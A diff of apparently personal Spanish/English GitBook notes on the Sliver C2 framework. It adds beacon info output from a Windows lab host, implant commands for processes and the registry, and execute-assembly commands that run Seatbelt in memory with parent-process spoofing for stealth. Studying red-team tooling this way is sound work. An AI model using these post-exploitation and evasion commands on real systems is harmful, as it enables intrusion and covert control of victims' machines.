@@ -52,7 +52,7 @@ netstat -putona | grep 31337
 #==> tcp6  0    0 :::31337      :::*       LISTEN    5362/sliver-server   off (0.00/0/0)
 ```
 
-<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>
 
 ## Implants y Beacons
 
@@ -143,6 +143,75 @@ sliver > sessions
 ========== ======================= =========== =================== ================= ========== ================== ======== ======================================== =========
  5c977c73   BEWILDERED_BRONCHITIS   mtls        192.168.1.5:50452   DESKTOP-0AHIE2G   MalTest    windows/amd64      en-US    Tue Jun  6 23:38:05 EDT 2023 (30s ago)   [ALIVE] 
 ```
+
+**System Info**
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+sliver (goodBoy) > info
+
+         Beacon ID: 8d2e1336-18a9-4eaa-af14-c7199015409f
+              Name: goodBoy
+          Hostname: DESKTOP-0AHIE2G
+              UUID: b58a4d56-453d-1ea9-448c-1fffde95d784
+          Username: DESKTOP-0AHIE2G\MalTest
+               UID: S-1-5-21-1050558549-14362656-3383254400-1001
+               GID: S-1-5-21-1050558549-14362656-3383254400-513
+               PID: 2472
+                OS: windows
+           Version: 10 build 19045 x86_64
+            Locale: en-US
+              Arch: amd64
+         Active C2: https://kali.dnstest.local?driver=wininet
+    Remote Address: 192.168.244.131:59001
+         Proxy URL: 
+          Interval: 5s
+            Jitter: 0s
+     First Contact: Sat Jul  1 22:03:57 EDT 2023 (7m45s ago)
+      Last Checkin: Sat Jul  1 22:11:39 EDT 2023 (3s ago)
+      Next Checkin: Sat Jul  1 22:11:44 EDT 2023 (in 2s)
+
+whoami: to get the username
+getuid: to get the UID
+getgid: to get the GID
+getpid: to get the PID
+
+
+sliver (goodBoy) > help reconfig 
+
+Reconfigure the active beacon/session
+
+Usage:
+======
+  reconfig [flags]
+
+Flags:
+======
+  -i, --beacon-interval    string    beacon callback interval
+  -j, --beacon-jitter      string    beacon callback jitter (random up to)
+  -h, --help                         display help
+  -r, --reconnect-interval string    reconnect interval for implant
+  -t, --timeout            int       command timeout in seconds (default: 60)
+  
+```
+{% endcode %}
+
+**Process**
+
+* `ps`: Shows a list of processes. Implemented based on the [CreateToolhelp32Snapshot](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) Windows API ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/rpc-handlers\_windows.go#L32) and [main implementation](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/ps/ps\_windows.go#L132)).
+* `geteprivs`: Shows the process integrity level of the implant process and the privileges. Implemented based on the [GetTokenInformation](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation) Windows API ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L577) and [main implementation](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/priv/priv\_windows.go#L445)).
+* `execute` Creates a new process given an executable and optionally some arguments. Implemented based on Golang’s [os/exec package](https://pkg.go.dev/os/exec) ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers.go#L398) uses the `exec.Command` function, if the `--token` argument is used there is another [command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L240) also using that function).
+* `terminate`: kills as process given a PID. Implemented based on Golangs [os package](https://pkg.go.dev/os) ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/rpc-handlers.go#L46) and [main implementation](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/ps/ps.go#L49) which uses `os.FindProcess` to get a process struct `p`, then `p.Kill` to kill it).
+* `kill`: kills the current beacon or session. Implemented as a special handler on Windows. For DLL or shellcode implants, it does the following: If the `--force` flag is set, it calls [ExitProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess) from `kernel32.dll`, else it called [ExitThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitthread) ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/special-handlers\_windows.go#L50)). For other implants, it just uses Golangs [os package](https://pkg.go.dev/os) to `Exit`, i.e., kill the current process.
+
+**Registers**
+
+* `registry read`: Read a value ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L487)).
+* `registry write`: Write a value ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L457)).
+* `registry create`: Create a new subkey ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L505)).
+* `registry delete`: Delete a key ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L522)).
+* `registry list-subkeys`: List all subkeys of a given key ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L539)).
+* `registry list-values`: List all values of a given key ([command handler](https://github.com/BishopFox/sliver/blob/v1.5.16/implant/sliver/handlers/handlers\_windows.go#L558)).
 
 #### DNS  address in Beacon
 
@@ -370,7 +439,27 @@ Para posteriormente compilarlo para que funcione en windows con MinGW:
 
 Y al ejecutar el programa compilado obtenemos una conexión (no encriptada) con el host víctima:&#x20;
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+## Execute Assembly
+
+{% embed url="https://github.com/BishopFox/sliver/wiki/Using-3rd-party-tools" %}
+
+Esta función nos permite ejecutar tanto DLL's como ejecutables en memoria, por lo que si queremos utilizar herramientas de terceros que no estén incluidas en Sliver lo podremos hacer a través de esta funcionalidad.  Lo primero es tener compilado el ejecutable o la DLL y después especificar si queremos ejecutarlo sobre el proceso en el que tengamos el implante o crear otro proceso para hacerlo más sigiloso. La desventaja es que solo corre únicamente aplicaciones escritas en **.NET**.
+
+```bash
+# Mismo proceso
+execute-assembly --in-process  --loot --name seatbelt /home/kali/Desktop/Sliver/Seatbelt.exe -group=User
+ 
+# Spoofear otro proceso especificando el process parent id (donde está nuestro implante)
+execute-assembly --ppid 5152 --process svchost.exe --loot --name seatbelt /home/kali/Desktop/Sliver/Seatbelt.exe -group=User
+```
+
+{% embed url="https://thewover.github.io/Introducing-Donut/" %}
 
